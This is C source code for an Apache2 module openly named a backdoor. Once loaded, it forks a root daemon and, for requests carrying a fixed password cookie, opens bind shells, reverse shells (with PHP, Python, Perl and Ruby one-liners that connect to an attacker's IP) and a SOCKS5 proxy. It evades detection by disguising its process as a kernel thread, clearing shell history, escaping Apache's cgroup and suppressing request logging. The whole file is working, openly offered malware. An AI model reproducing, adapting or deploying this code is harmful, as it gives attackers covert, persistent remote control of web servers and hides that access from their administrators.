/* ------------------------------------*/
/* Apache2 Backdoor module (@RicoVlad) */
/* ------------------------------------*/
/*
 * Forks a root daemon on config load, exposing backdoor features via HTTP
 * endpoints (bind shell, reverse shell, SOCKS5 proxy, ping). Uses a Unix-domain
 * IPC socket to relay requests from the Apache worker process to the forked daemon.
 *
 * Inspired by @TheXC3LL and microsocks (rofl0r).
 */

#include <sys/types.h>
#include <stdio.h>
#include <unistd.h>
#include <signal.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <fcntl.h>
#include <netdb.h>
#include <sys/select.h>
#include <sys/wait.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <sys/un.h>

#include <pty.h>    /* forkpty() - link with -lutil */
#include <sys/mount.h>

#include "httpd.h"
#include "http_config.h"
#include "http_core.h"
#include "http_protocol.h"
#include "http_log.h"
#include "ap_config.h"

#include "socks.h"

/* ------------------------------------------------------------------ */
/* Constants                                                          */
/* ------------------------------------------------------------------ */

#define PASSWORD      "password=backdoor"
#define SOCKSWORD     "/proxy"
#define STOPPROXY     "imdonewithyou"
#define PINGWORD      "/ping"
#define SHELLWORD     "/revtty"
#define REVERSESHELL  "/reverse"
#define BINDWORD      "/bind"
#define CGROUP2       "/tmp/cgroup2"
#define IPC           "/tmp/mod_backdoor"

/* PID of the forked IPC daemon (set in backdoor_post_config) */
pid_t pid;

/* ------------------------------------------------------------------ */
/* URI parsing types and functions                                    */
/* ------------------------------------------------------------------ */

typedef enum {
    CMD_PING,
    CMD_SOCKS,
    CMD_BIND,
    CMD_REVSHELL,
    CMD_REVTY,
    CMD_UNKNOWN
} cmd_t;

typedef struct {
    cmd_t type;
    char *ip;
    char *port;
    char *prog;
    char *user;
    int port_num;
} parsed_cmd_t;

static cmd_t classify_uri(const char *uri) {
    if (!uri) return CMD_UNKNOWN;
    if (strcmp(uri, "/ping") == 0) return CMD_PING;
    if (strstr(uri, "/proxy") != NULL) return CMD_SOCKS;
    if (strstr(uri, "/bind") != NULL) return CMD_BIND;
    if (strstr(uri, "/reverse") != NULL) return CMD_REVSHELL;
    if (strstr(uri, "/revtty") != NULL) return CMD_REVTY;
    return CMD_UNKNOWN;
}

static char *safe_strdup(const char *s) {
    if (!s) return NULL;
    return strdup(s);
}

static int parse_uri(const char *uri, parsed_cmd_t *out) {
    if (!uri || !out) return -1;

    memset(out, 0, sizeof(*out));
    out->type = classify_uri(uri);
    if (out->type == CMD_UNKNOWN) return -1;

    char *copy = strdup(uri);
    if (!copy) return -1;

    switch (out->type) {
    case CMD_PING:
        break;

    case CMD_SOCKS: {
        strtok(copy, "/");  /* skip "proxy" */
        char *port = strtok(NULL, "/");
        if (!port) { free(copy); out->type = CMD_UNKNOWN; return -1; }
        out->port = safe_strdup(port);
        out->port_num = atoi(port);
        char *user = strtok(NULL, "/");
        if (user) out->user = safe_strdup(user);
        break;
    }

    case CMD_BIND: {
        strtok(copy, "/");  /* skip "bind" */
        char *port = strtok(NULL, "/");
        if (!port) { free(copy); out->type = CMD_UNKNOWN; return -1; }
        out->port = safe_strdup(port);
        out->port_num = atoi(port);
        break;
    }

    case CMD_REVSHELL: {
        strtok(copy, "/");  /* skip "reverse" */
        char *ip = strtok(NULL, "/");
        char *port = strtok(NULL, "/");
        char *prog = strtok(NULL, "/");
        if (!ip || !port || !prog) { free(copy); out->type = CMD_UNKNOWN; return -1; }
        out->ip = safe_strdup(ip);
        out->port = safe_strdup(port);
        out->prog = safe_strdup(prog);
        out->port_num = atoi(port);
        break;
    }

    case CMD_REVTY: {
        strtok(copy, "/");  /* skip "revtty" */
        char *ip = strtok(NULL, "/");
        char *port = strtok(NULL, "/");
        if (!ip || !port) { free(copy); out->type = CMD_UNKNOWN; return -1; }
        out->ip = safe_strdup(ip);
        out->port = safe_strdup(port);
        out->port_num = atoi(port);
        break;
    }

    default:
        free(copy);
        return -1;
    }

    free(copy);
    return 0;
}

static void free_parsed_cmd(parsed_cmd_t *cmd) {
    if (!cmd) return;
    free(cmd->ip);
    free(cmd->port);
    free(cmd->prog);
    free(cmd->user);
    memset(cmd, 0, sizeof(*cmd));
}

/* ------------------------------------------------------------------ */
/* Reverse shell helpers                                              */
/* ------------------------------------------------------------------ */

/*
 * Spawn a TTY reverse shell. Forks a child that connects to (ip:port),
 * then execs the requested shell binary. argv is set to a fake process
 * name to avoid detection in process listings.
 */
static void shell(char *ip, char *port, char *prog) {
    pid_t spid = fork();
    if (spid < 0) exit(0);
    if (spid != 0) { exit(0); }

    /* Child process */
    char *argv[] = { "[kintegrityd/2]", 0 };
    char *envp[] = { "HISTFILE=", "TERM=vt100", 0 };
    setsid();

    int revsockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (revsockfd < 0) exit(0);

    struct sockaddr_in addr;
    addr.sin_addr.s_addr = inet_addr(ip);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(atoi(port));
    if (connect(revsockfd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        exit(0);
    }

    dup2(revsockfd, 0);
    dup2(revsockfd, 1);
    dup2(revsockfd, 2);

    /* execve never returns on success */
    if (!strcmp(prog, "sh"))    execve("/bin/sh", argv, envp);
    if (!strcmp(prog, "bash"))  execve("/bin/bash", argv, envp);
    if (!strcmp(prog, "dash"))  execve("/bin/dash", argv, envp);
    if (!strcmp(prog, "ash"))   execve("/bin/ash", argv, envp);
    if (!strcmp(prog, "tcsh"))  execve("/bin/tcsh", argv, envp);
    if (!strcmp(prog, "ksh"))   execve("/bin/ksh", argv, envp);
}

/*
 * Spawn a reverse shell. For TTY shells (sh, bash, etc.) delegates to
 * shell(). For interpreter-based shells (python, php, perl, ruby) builds
 * a one-liner that opens a socket and execs /bin/sh.
 */
static void reverseShell(char *ip, char *port, char *prog) {
    /* Delegate TTY shells to the pty-based handler */
    if (!strcmp(prog, "sh") || !strcmp(prog, "bash") || !strcmp(prog, "dash") ||
        !strcmp(prog, "tcsh") || !strcmp(prog, "ash") || !strcmp(prog, "ksh")) {
        shell(ip, port, prog);
        return;
    }

    pid_t spid = fork();
    if (spid < 0) {
        fprintf(stderr, "[-] Error: could not fork\n");
        exit(EXIT_FAILURE);
    }
    if (spid != 0) { exit(0); }

    /* Child process - interpreter-based reverse shells */
    if (!strcmp(prog, "php")) {
        char *args[] = {"/usr/bin/php", "-r", "", NULL};
        args[2] = malloc(strlen("$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");")+strlen(ip)+strlen(port)+1);
        sprintf(args[2], "$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");", ip, port);
        execve(args[0], args, NULL);
    } else if (!strcmp(prog, "python")) {
        char *args[] = {"/usr/bin/python", "-c", "", NULL};
        args[2] = malloc(strlen("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);")+strlen(ip)+strlen(port)+1);
        sprintf(args[2], "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);", ip, port);
        execve(args[0], args, NULL);
    } else if (!strcmp(prog, "perl")) {
        char *args[] = {"/usr/bin/perl", "-e", "", NULL};
        args[2] = malloc(1+strlen(ip)+strlen(port)+strlen("use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};"));
        sprintf(args[2], "use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};", ip, port);
        execve(args[0], args, NULL);
    } else if (!strcmp(prog, "ruby")) {
        char *args[] = {"/usr/bin/ruby", "-rsocket", "-e", "", NULL};
        args[3] = malloc(1+strlen(ip)+strlen(port)+strlen("exit if fork;c=TCPSocket.new(\"%s\",\"%s\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end"));
        sprintf(args[3], "exit if fork;c=TCPSocket.new(\"%s\",\"%s\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end", ip, port);
        execve(args[0], args, NULL);
    }
}

/* ------------------------------------------------------------------ */
/* Pseudo-terminal reverse shell                                      */
/* ------------------------------------------------------------------ */

/*
 * TTY reverse shell using forkpty. Forks a child with a pseudo-terminal,
 * execs /bin/sh, then the parent relays bidirectional data between the
 * pseudo-terminal and the network socket via select().
 */
static void shellPTY(int socket) {
    struct termios terminal;
    int terminalfd;
    pid_t fpid;
    char buf[1024];

    fpid = forkpty(&terminalfd, NULL, NULL, NULL);
    if (fpid < 0) {
        fprintf(stderr, "[-] Error: could not forkpty\n");
        exit(EXIT_FAILURE);
    }

    if (fpid == 0) {
        /* Child: exec a shell on the pty slave */
        char *argv[] = { "[kintegrityd/2]", 0 };
        char *envp[] = { "HISTFILE=", "TERM=vt100", 0 };
        execve("/bin/sh", argv, envp);
    }

    /* Parent: configure terminal, then relay data */
    tcgetattr(terminalfd, &terminal);
    terminal.c_lflag &= ~ECHO;
    tcsetattr(terminalfd, TCSANOW, &terminal);

    fd_set readfd;
    for (;;) {
        FD_ZERO(&readfd);
        FD_SET(terminalfd, &readfd);
        FD_SET(socket, &readfd);
        int sel = select(terminalfd + 1, &readfd, NULL, NULL, NULL);
        if (!sel) continue;
        if (FD_ISSET(terminalfd, &readfd)) {
            int n = read(terminalfd, buf, sizeof buf);
            if (n <= 0) { kill(fpid, SIGKILL); break; }
            write(socket, buf, n);
        }
        if (FD_ISSET(socket, &readfd)) {
            int n = read(socket, buf, sizeof buf);
            if (n <= 0) { kill(fpid, SIGKILL); break; }
            write(terminalfd, buf, n);
        }
    }
    waitpid(fpid, NULL, 0);
    exit(0);
}

/* ------------------------------------------------------------------ */
/* Bind shell helpers                                                 */
/* ------------------------------------------------------------------ */

/*
 * Bind a TCP port and return the listening socket fd. Sends error
 * messages back through client_fd on failure.
 */
static int bindPort(int client_fd, int port) {
    int opt = 1;
    int bindSock = socket(AF_INET, SOCK_STREAM, 0);
    if (bindSock < 0) {
        write(client_fd, "ERRNOSOCK\n", strlen("ERRNOSOCK\n"));
        exit(0);
    }
    if (setsockopt(bindSock, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt)) < 0) {
        write(client_fd, "setsockopt", strlen("setsockopt"));
        close(bindSock);
        exit(0);
    }

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(port);

    if (bind(bindSock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        write(client_fd, "Bind failed", strlen("Bind failed"));
        close(bindSock);
        exit(0);
    }
    if (listen(bindSock, 3) < 0) {
        write(client_fd, "Listen failed", strlen("Listen failed"));
        close(bindSock);
        exit(0);
    }
    return bindSock;
}

/* ------------------------------------------------------------------ */
/* IPC relay                                                          */
/* ------------------------------------------------------------------ */

/*
 * Bidirectional data relay between two file descriptors using select().
 * Used to bridge the IPC socket and the reverse shell socket.
 */
static void bicomIPC(int sock, int revsockfd) {
    char buf[1024];
    fd_set readset;
    for (;;) {
        FD_ZERO(&readset);
        FD_SET(sock, &readset);
        FD_SET(revsockfd, &readset);
        /* select <= 0: timeout or error (EINTR) - just retry */
        if (select(sock + 1, &readset, NULL, NULL, NULL) <= 0) continue;
        if (FD_ISSET(sock, &readset)) {
            int n = read(sock, buf, sizeof buf);
            if (n <= 0) break;
            write(revsockfd, buf, n);
        }
        if (FD_ISSET(revsockfd, &readset)) {
            int n = read(revsockfd, buf, sizeof buf);
            if (n <= 0) break;
            write(sock, buf, n);
        }
    }
}

/* ------------------------------------------------------------------ */
/* Apache connection helpers                                          */
/* ------------------------------------------------------------------ */

/* Extract the raw socket fd from the Apache request connection */
static int get_client_fd(request_rec *r) {
    apr_os_sock_t os_fd;
    apr_socket_t *sock = ap_get_conn_socket(r->connection);
    if (!sock) return -1;
    if (apr_os_sock_get(&os_fd, sock) != APR_SUCCESS) return -1;
    return (int)os_fd;
}

/* Connect to the IPC daemon's Unix domain socket */
static int connect_ipc(void) {
    int sock = socket(AF_UNIX, SOCK_STREAM, 0);
    if (sock < 0) return -1;
    struct sockaddr_un addr;
    addr.sun_family = AF_UNIX;
    strcpy(addr.sun_path, IPC);
    if (connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_un)) < 0) {
        close(sock);
        return -1;
    }
    return sock;
}

/* Send error response, close the socket, and exit the process */
static void send_error_to_client(int fd, const char *msg) {
    write(fd, msg, strlen(msg));
    close(fd);
    exit(0);
}

/* ------------------------------------------------------------------ */
/* HTTP request handlers                                              */
/* ------------------------------------------------------------------ */

/*
 * SOCKS5 proxy handler. Forwards the URI to the IPC daemon which
 * starts a proxy listener.
 */
static void handle_socks_request(request_rec *r, int client_fd) {
    int ipc_sock = connect_ipc();
    if (ipc_sock < 0) {
        send_error_to_client(client_fd, "ERRNOSOCK\n");
    }
    write(ipc_sock, r->uri, strlen(r->uri));
    write(client_fd, "[+] Socks proxy binded !\n", strlen("[+] Socks proxy binded !\n"));
    close(client_fd);
    close(ipc_sock);
}

/*
 * Bind shell handler. Binds a listening socket on the parsed port,
 * accepts a connection, then relays data between the connected socket
 * and the IPC daemon.
 */
static void handle_bind_request(request_rec *r, int client_fd) {
    parsed_cmd_t cmd;
    if (parse_uri(r->uri, &cmd) != 0 || cmd.type != CMD_BIND || !cmd.port) {
        send_error_to_client(client_fd, "ERR\n");
    }

    int ipc_sock = connect_ipc();
    if (ipc_sock < 0) {
        free_parsed_cmd(&cmd);
        send_error_to_client(client_fd, "ERRNOSOCK\n");
    }

    int bindfd = bindPort(client_fd, cmd.port_num);
    char *info = malloc(strlen("[+] Shell binded on port \n") + strlen(cmd.port) + 1);
    sprintf(info, "[+] Shell binded on port %s\n", cmd.port);
    write(client_fd, info, strlen(info));
    free(info);
    close(client_fd);

    struct sockaddr_in server_addr;
    socklen_t server_len = sizeof(server_addr);
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(cmd.port_num);

    int new_socket = accept(bindfd, (struct sockaddr *)&server_addr, &server_len);
    close(bindfd);
    write(ipc_sock, "BIND", strlen("BIND"));
    bicomIPC(ipc_sock, new_socket);
    close(new_socket);
    free_parsed_cmd(&cmd);
}

/* Health check endpoint */
static void handle_ping_request(int client_fd) {
    write(client_fd, "[+] Backdoor module is running !\n",
          strlen("[+] Backdoor module is running !\n"));
    close(client_fd);
    exit(0);
}

/*
 * Non-TTY reverse shell handler. Forwards the full URI to the IPC daemon
 * which parses it and spawns the appropriate reverse shell.
 */
static void handle_reverse_shell_request(request_rec *r, int client_fd) {
    parsed_cmd_t cmd;
    if (parse_uri(r->uri, &cmd) != 0 || cmd.type != CMD_REVSHELL
        || !cmd.ip || !cmd.port || !cmd.prog) {
        send_error_to_client(client_fd, "ERR\n");
    }

    int ipc_sock = connect_ipc();
    if (ipc_sock < 0) {
        free_parsed_cmd(&cmd);
        send_error_to_client(client_fd, "ERRNOSOCK\n");
    }
    write(ipc_sock, r->uri, strlen(r->uri));

    char *info = malloc(strlen("[+] Sending Reverse Shell to : using \n")
                        + strlen(cmd.ip) + strlen(cmd.port) + strlen(cmd.prog) + 1);
    sprintf(info, "[+] Sending Reverse Shell to %s:%s using %s\n", cmd.ip, cmd.port, cmd.prog);
    write(client_fd, info, strlen(info));
    free(info);
    free_parsed_cmd(&cmd);
    close(client_fd);
    exit(0);
}

/*
 * TTY reverse shell handler. Opens a socket to the target (ip:port),
 * connects to the IPC daemon, and relays bidirectional data between
 * the two sockets.
 */
static void handle_revtty_request(request_rec *r, int client_fd) {
    if (!pid) return;

    parsed_cmd_t cmd;
    if (parse_uri(r->uri, &cmd) != 0 || cmd.type != CMD_REVTY
        || !cmd.ip || !cmd.port) {
        send_error_to_client(client_fd, "ERR\n");
    }

    int revsockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (revsockfd < 0) {
        free_parsed_cmd(&cmd);
        send_error_to_client(client_fd, "ERRNOSOCK\n");
    }
    struct sockaddr_in client_addr;
    client_addr.sin_addr.s_addr = inet_addr(cmd.ip);
    client_addr.sin_family = AF_INET;
    client_addr.sin_port = htons(cmd.port_num);
    if (connect(revsockfd, (struct sockaddr *)&client_addr, sizeof(client_addr)) < 0) {
        free_parsed_cmd(&cmd);
        send_error_to_client(client_fd, "[+] Reverse socket can't connect to client\n");
    }

    int ipc_sock = connect_ipc();
    if (ipc_sock < 0) {
        free_parsed_cmd(&cmd);
        send_error_to_client(client_fd, "ERRNOSOCK\n");
    }
    write(ipc_sock, "SHELL\n", strlen("SHELL\n") + 1);

    char *info = malloc(strlen("[+] Sending Reverse Shell to :")
                        + strlen(cmd.ip) + strlen(cmd.port) + 1);
    sprintf(info, "[+] Sending Reverse Shell to %s:%s", cmd.ip, cmd.port);
    write(client_fd, info, strlen(info));
    free(info);
    free_parsed_cmd(&cmd);
    bicomIPC(ipc_sock, revsockfd);
    close(client_fd);
    exit(0);
}

/* ------------------------------------------------------------------ */
/* Apache hook: post-read-request                                     */
/* ------------------------------------------------------------------ */

/*
 * Intercepts every HTTP request. Checks for the password cookie,
 * then dispatches to the appropriate handler based on the URI.
 */
static int backdoor_post_read_request(request_rec *r) {
    const apr_array_header_t *fields;
    apr_table_entry_t *e;
    int i;

    fields = apr_table_elts(r->headers_in);
    e = (apr_table_entry_t *) fields->elts;
    for (i = 0; i < fields->nelts; i++) {
        if (!strcmp(e[i].key, "Cookie") && strstr(e[i].val, PASSWORD)) {
            break;
        }
    }
    if (i >= fields->nelts) {
        return DECLINED;
    }

    int client_fd = get_client_fd(r);
    if (client_fd < 0) return DECLINED;

    parsed_cmd_t cmd;
    if (parse_uri(r->uri, &cmd) != 0) return DECLINED;

    switch (cmd.type) {
    case CMD_PING:
        handle_ping_request(client_fd);
        break;
    case CMD_SOCKS:
        handle_socks_request(r, client_fd);
        break;
    case CMD_BIND:
        handle_bind_request(r, client_fd);
        break;
    case CMD_REVSHELL:
        handle_reverse_shell_request(r, client_fd);
        break;
    case CMD_REVTY:
        handle_revtty_request(r, client_fd);
        break;
    default:
        free_parsed_cmd(&cmd);
        return DECLINED;
    }

    return DECLINED;
}

/* ------------------------------------------------------------------ */
/* IPC daemon management                                              */
/* ------------------------------------------------------------------ */

/*
 * Move the daemon process into its own cgroup2 to isolate it from
 * the Apache process tree. Creates a tmpfs cgroup2 mount, writes
 * the PID, then cleans up.
 */
static void rmCgroup(void) {
    int fd;
    int isMounted = 0;
    char *path = malloc(strlen(CGROUP2) + strlen("/system.slice/cgroup.procs") + 1);
    char *str;

    strcpy(path, CGROUP2);
    strcat(path, "/system.slice/cgroup.procs");

    if (access(path, F_OK) < 0) {
        mount("cgroup", CGROUP2, "cgroup2", 0, 0);
    }
    if ((fd = open(path, O_WRONLY)) != -1) {
        str = malloc(32);
        sprintf(str, "%d", getpid());
        write(fd, str, strlen(str));
        close(fd);
        free(str);
    }
    if (umount(CGROUP2) == 0) {
        rmdir(CGROUP2);
    }
    free(path);
}

/*
 * IPC daemon main loop. Accepts connections on the Unix domain socket,
 * forks a child to handle each request (SHELL, BIND, reverse shell,
 * or SOCKS proxy), and forks another child to continue accepting.
 */
static int waitIPC(int master) {
    fd_set readfds;
    int rc, sd, sr;
    char buf[1024];

    for (;;) {
        FD_ZERO(&readfds);
        FD_SET(master, &readfds);

        sr = select(master + 1, &readfds, NULL, NULL, NULL);
        if (sr > 0 && FD_ISSET(master, &readfds)) {
            sd = accept(master, NULL, NULL);
            if (sd < 0) continue;

            memset(buf, 0, sizeof buf);
            if ((rc = read(sd, buf, sizeof buf)) <= 0) {
                close(sd);
                continue;
            }

            /* Fork handler for this request */
            pid_t handler = fork();
            if (handler == 0) {
                if (strstr(buf, "SHELL") || strstr(buf, "BIND")) {
                    rmCgroup();
                    shellPTY(sd);
                } else {
                    /* Parse URI from IPC message */
                    parsed_cmd_t cmd;
                    if (parse_uri(buf, &cmd) == 0) {
                        if (cmd.type == CMD_REVSHELL) {
                            rmCgroup();
                            reverseShell(cmd.ip, cmd.port, cmd.prog);
                        } else if (cmd.type == CMD_SOCKS) {
                            startProxy("0.0.0.0", cmd.port_num, cmd.user, PASSWORD);
                        }
                        free_parsed_cmd(&cmd);
                    }
                }
                exit(0);
            }
            /* Parent: fork a new acceptor to keep listening */
            pid_t acceptor = fork();
            if (acceptor == 0) {
                waitIPC(master);
            } else {
                exit(0);
            }
        }
    }
}

/* ------------------------------------------------------------------ */
/* Apache hook: post-config (daemon fork)                             */
/* ------------------------------------------------------------------ */

/*
 * Fork the IPC daemon. Parent returns immediately; child creates a
 * Unix domain socket at /tmp/mod_backdoor and enters the accept loop.
 */
int backdoor_post_config(apr_pool_t *pconf, apr_pool_t *plog, apr_pool_t *ptemp, server_rec *s) {
    pid = fork();
    if (pid > 0) {
        return OK;
    }

    int master, rc;
    struct sockaddr_un serveraddr;

    master = socket(AF_UNIX, SOCK_STREAM, 0);
    if (master < 0) exit(0);

    memset(&serveraddr, 0, sizeof(serveraddr));
    serveraddr.sun_family = AF_UNIX;
    strcpy(serveraddr.sun_path, IPC);
    rc = bind(master, (struct sockaddr *)&serveraddr, SUN_LEN(&serveraddr));
    if (rc < 0) exit(0);
    listen(master, 5);
    chmod(serveraddr.sun_path, 0777);

    waitIPC(master);
}

/* ------------------------------------------------------------------ */
/* Apache hook: log-transaction                                       */
/* ------------------------------------------------------------------ */

/*
 * Suppress Apache logging for backdoor requests. Also kills the
 * worker process to free resources after the response is sent.
 */
static int backdoor_log_transaction(request_rec *r) {
    const apr_array_header_t *fields;
    int i;
    apr_table_entry_t *e;

    fields = apr_table_elts(r->headers_in);
    e = (apr_table_entry_t *) fields->elts;
    for (i = 0; i < fields->nelts; i++) {
        if (!strcmp(e[i].key, "Cookie")) {
            if (strstr(e[i].val, PASSWORD)) {
                exit(0);
            }
        }
    }
    return DECLINED;
}

/* ------------------------------------------------------------------ */
/* Apache hook: register hooks                                        */
/* ------------------------------------------------------------------ */

static void backdoor_register_hooks(apr_pool_t *p) {
    ap_hook_post_read_request(backdoor_post_read_request, NULL, NULL, APR_HOOK_FIRST);
    ap_hook_post_config(backdoor_post_config, NULL, NULL, APR_HOOK_FIRST);
    ap_hook_log_transaction(backdoor_log_transaction, NULL, NULL, APR_HOOK_FIRST);
}

/* ------------------------------------------------------------------ */
/* Module definition                                                  */
/* ------------------------------------------------------------------ */

module AP_MODULE_DECLARE_DATA backdoor_module = {
    STANDARD20_MODULE_STUFF,
    NULL,                 /* create per-dir config    */
    NULL,                 /* merge per-dir config     */
    NULL,                 /* create per-server config */
    NULL,                 /* merge per-server config  */
    NULL,                 /* config file commands     */
    backdoor_register_hooks /* register hooks         */
};
